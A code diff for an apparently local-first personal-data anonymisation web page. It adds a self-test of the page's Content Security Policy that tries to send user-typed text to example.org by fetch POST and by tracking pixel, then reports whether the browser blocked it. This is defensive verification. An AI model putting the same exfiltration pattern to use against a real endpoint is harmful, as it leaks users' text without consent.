   const W = 360, H = 250, P = { l: 36, r: 12, t: 12, b: 34 }, iw = W - P.l - P.r, ih = H - P.t - P.b;
@@ -2107,6 +2246,7 @@ function renderCaseTable() {
 }
 $('#testRun').addEventListener('click', runTest);
 $('#testT').addEventListener('input', renderTest);
+$('#volN').addEventListener('input', renderTest); $('#volMin').addEventListener('input', renderTest);
 
 /* ---------------- personal data: detectors ---------------- */
 const TITLES = 'Mr|Mrs|Ms|Miss|Dr|Prof|Mister|Madam|M\\.|Mme|Mlle|Monsieur|Madame|Herr|Frau|Sr\\.?|Sra\\.?|Señor|Señora|Sig\\.?|Sig\\.ra|Signor|Signora';
@@ -2632,6 +2772,36 @@ wireDrop($('#synDrop'), $('#synFile'), async (files) => {
   if (docs.length) { syn.docs = docs; renderSynFiles(); toast(`Read ${docs.length} file${docs.length === 1 ? '' : 's'} in this tab`); runSyn(); }
 });
 
+/* ---------------- the lock: the page's security policy (the CSP meta tag in <head>), tested by trying to break it ---------------- */
+// A test that could answer the other way: if the browser does not apply the policy, the fetch resolves and the page says so.
+const LEAK_TO = 'https://example.org/collect';
+async function tryLeak(kind, text) {
+  let refusedBy = null;
+  let refusedAt = 0;
+  const onViolation = (e) => { if (!refusedBy && String(e.blockedURI || '').startsWith('https://example.org')) { refusedBy = e.effectiveDirective || e.violatedDirective; refusedAt = performance.now(); } };
+  document.addEventListener('securitypolicyviolation', onViolation);
+  const t0 = performance.now(); let sent = false;
+  try {
+    if (kind === 'fetch') { await fetch(LEAK_TO, { method: 'POST', mode: 'no-cors', body: text }); sent = true; }
+    else await new Promise((res) => { const img = new Image(); img.onload = () => { sent = true; res(); }; img.onerror = res; img.src = LEAK_TO + '.gif?d=' + encodeURIComponent(text.slice(0, 200)); });
+  } catch (e) { /* refused, or no network: the violation event says which */ }
+  await new Promise((r) => setTimeout(r, 80));   // the browser reports the violation just after it refuses
+  document.removeEventListener('securitypolicyviolation', onViolation);
+  return { kind, sent, refusedBy, ms: Math.max(0, (refusedAt || performance.now()) - t0) };
+}
+$('#lockRun').addEventListener('click', async () => {
+  const text = $('#lockText').value.trim(), btn = $('#lockRun'); if (!text) return toast('Type something to send first');
+  btn.disabled = true; btn.textContent = 'Trying…';
+  const runs = [await tryLeak('fetch', text), await tryLeak('pixel', text)];
+  const what = { fetch: 'A script request (fetch, POST)', pixel: 'A tracking pixel (image)' };
+  $('#lockOut').innerHTML = runs.map((r) => r.refusedBy
+    ? `<div class="lk"><b>Refused</b><div>${what[r.kind]} to example.org, stopped by your browser under <code>${esc(r.refusedBy)}</code> in ${r.ms < 1 ? 'under 1' : Math.round(r.ms)} ms. Nothing was sent.</div></div>`
+    : r.sent ? `<div class="lk bad"><b>Sent</b><div>${what[r.kind]} reached example.org: this browser did not apply the page's policy.</div></div>`
+    : `<div class="lk warn"><b>Unclear</b><div>${what[r.kind]} failed, but the browser reported no refusal. It may have failed for another reason, such as no network.</div></div>`).join('')
+    + `<div class="sub">The policy allows connections to ${esc(location.host || 'this site')} only. Your browser's console shows the same refusals.</div>`;
+  btn.disabled = false; btn.textContent = 'Try again';
+});
+
 /* ---------------- offline shell: a service worker keeps the page, the runtime script and the fonts, so a reload works with no connection ---------------- */
 try {
   if ('serviceWorker' in navigator && (location.protocol === 'https:' || /^(localhost|127\.0\.0\.1)$/.test(location.hostname))) {
@@ -2645,8 +2815,11 @@ $('#installBtn').addEventListener('click', async () => { if (!installEvt) return
 /* ---------------- start ---------------- */
 renderModelCards(); deviceCheck(); mountWidgets(); renderTest(); renderCaseTable(); renderNet(); renderMeter(); checkCached();
 $('#anonIn').value = SAMPLE_LETTER; runAnon(); xpGo(1);
-let tourSeen = false; try { tourSeen = localStorage.getItem('sl_tour_done') === '1'; } catch (e) {}
-if (!tourSeen) setTimeout(tourStart, 700);
+// The tour is offered, not imposed: a modal over the hero on first load hid the page from a room watching it presented.
+// It starts from the hero button or the sidebar, and on its own only for a link that asks for it (?tour).
+if (/\/second-look\/?/.test(location.pathname)) $('#sideLab').hidden = false;
+$('#tourStartBtn').addEventListener('click', () => { xpGo(1); tourStart(); });
+if (new URLSearchParams(location.search).has('tour')) setTimeout(tourStart, 700);
 renderSynFiles(); runSyn();
 $('#dlTotal').textContent = `0 / ${MB(TOTAL)}`; if (!state.cached) $('#dlText').textContent = `Download the models · ${MB(TOTAL)}`;
 })();
